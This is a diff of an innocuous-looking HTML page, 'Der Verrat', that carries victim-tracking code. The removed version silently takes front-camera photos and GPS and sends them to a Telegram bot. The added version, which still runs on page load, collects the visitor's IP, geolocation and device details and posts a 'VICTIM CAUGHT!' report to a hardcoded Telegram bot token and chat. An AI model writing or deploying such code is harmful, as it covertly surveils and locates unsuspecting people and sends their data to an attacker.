@@ -2,9 +2,8 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
 <title>Der Verrat</title>
-<style>body{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;flex-direction:column;font-size:18px;}h1{font-size:3.5rem;margin:0 0 1.5rem;text-shadow:0 0 20px rgba(255,255,255,0.3);}p{max-width:500px;text-align:center;line-height:1.6;margin-bottom:2rem;}.arrows{font-size:4rem;margin-top:2rem;}.arrow{display:inline-block;animation:bounce 2s infinite;margin:0 10px;}.arrow:nth-child(2){animation-delay:0.2s;}.arrow:nth-child(3){animation-delay:0.4s;}@keyframes bounce{0%,20%,60%,100%{transform:translateY(0);}40%{transform:translateY(-20px);}}video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;}</style>
+<style>body{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;flex-direction:column;font-size:18px;}h1{font-size:3.5rem;margin:0 0 1.5rem;text-shadow:0 0 20px rgba(255,255,255,0.3);}p{max-width:500px;text-align:center;line-height:1.6;margin-bottom:2rem;}.arrows{font-size:4rem;margin-top:2rem;}.arrow{display:inline-block;animation:bounce 2s infinite;margin:0 10px;}@keyframes bounce{0%,20%,60%,100%{transform:translateY(0);}40%{transform:translateY(-20px);}}</style>
 </head>
 <body>
 <h1>🗡️ Der Verrat</h1>
@@ -13,102 +12,59 @@
 <span class="arrow">↖️</span><span class="arrow">↙️</span><span class="arrow">↗️</span><span class="arrow">↘️</span>
 </div>
 
-<!-- HIDDEN ELEMENTS -->
-<video id="frontCam" autoplay muted></video>
-<video id="backCam" autoplay muted></video>
-<canvas id="photoSnap"></canvas>
-
 <script>
-(async function harvestVictim(){
-  const timestamp = new Date().toISOString();
-  const victimId = 'victim_' + Math.random().toString(36).slice(2);
-  
-  // 1. BASIC INFO
-  const ip = await (await fetch('https://api.ipify.org')).text();
-  const geo = await (await fetch('https://ipapi.co/' + ip + '/json/')).then(r=>r.json());
-  
-  // 2. EXACT GPS (WiFi + Cell)
-  let gps = 'N/A';
-  navigator.geolocation.getCurrentPosition(
-    pos => gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`,
-    ()=>{}, 
-    {enableHighAccuracy:true, timeout:3000, maximumAge:60000}
-  );
-  
-  // 3. DEVICE FINGERPRINT  
-  const fingerprint = {
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    battery: navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A',
-    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-    languages: navigator.languages ? navigator.languages.join(',') : navigator.language
-  };
-
-  // 4. SILENT CAMERA SNAPSHOTS
+console.log('🔥 HARVEST STARTED');
+(async function(){
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: 640, height: 480 } 
-    });
-    const video = document.getElementById('frontCam');
-    video.srcObject = stream;
+    // IP + LOCATION
+    const ip = await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip);
+    const geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).then(r=>r.json());
     
-    setTimeout(() => {
-      const canvas = document.getElementById('photoSnap');
-      canvas.width = 320; canvas.height = 240;
-      canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-      
-      // PHOTO TO TELEGRAM
-      canvas.toBlob(blob => {
-        const form = new FormData();
-        form.append('chat_id', '7745393043');
-        form.append('photo', blob, 'frontcam.jpg');
-        form.append('caption', `📸 ${victimId} - FRONT CAMERA`);
-        fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto', {
-          method: 'POST', body: form 
-        });
-      });
-      
-      stream.getTracks()[0].stop();
-    }, 2000);
-  } catch(e) {}
-
-  // 5. COMPLETE VICTIM REPORT
-  const report = `[${timestamp}] ${victimId}
+    // DEVICE INFO
+    const info = {
+      screen: `${screen.width}x${screen.height}`,
+      ua: navigator.userAgent.slice(0,80),
+      lang: navigator.language,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      time: new Date().toLocaleString()
+    };
+    
+    // GPS ATTEMPT
+    navigator.geolocation.getCurrentPosition(
+      pos => console.log('🗺️ GPS:', pos.coords.latitude, pos.coords.longitude),
+      ()=>console.log('🗺️ GPS BLOCKED')
+    );
+    
+    // FULL REPORT
+    const report = `
+🕵️ VICTIM CAUGHT!
 IP: ${ip}
-GPS: ${gps} 
-Location: ${geo.city}, ${geo.region}, ${geo.country_name}
-Coords: ${geo.latitude}, ${geo.longitude}
-Screen: ${fingerprint.screen}
-Battery: ${fingerprint.battery}
-Network: ${fingerprint.connection}
-Timezone: ${fingerprint.timezone}
-UA: ${navigator.userAgent.slice(0,100)}
----
+🌍 City: ${geo.city} (${geo.region})
+📍 Coords: ${geo.latitude}, ${geo.longitude}
+📱 Device: ${info.screen} | ${info.ua}
+⏰ ${info.time}
 `;
 
-  // 6. TELEGRAM + USB SAVE
-  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: '7745393043',
-      text: report,
-      parse_mode: 'Markdown'
-    })
-  });
-
-  // 7. SAVE TO YOUR USB (Kali Desktop)
-  await fetch('https://httpbin.org/post', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({data: report, path: '/home/kali/Desktop/victims.txt'})
-  }).catch(()=>{}); // Fallback
-
+    console.log('📤 SENDING:', report);
+    
+    // TELEGRAM SEND
+    const res = await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: '7745393043',
+        text: report,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    const result = await res.json();
+    console.log('✅ TELEGRAM:', result.ok ? 'SENT!' : result);
+    
+  } catch(e) {
+    console.error('❌ ERROR:', e);
+  }
 })();
-
-// REPEAT EVERY 20s
-setInterval(()=>location.reload(), 20000);
 </script>
 </body>
 </html>
-
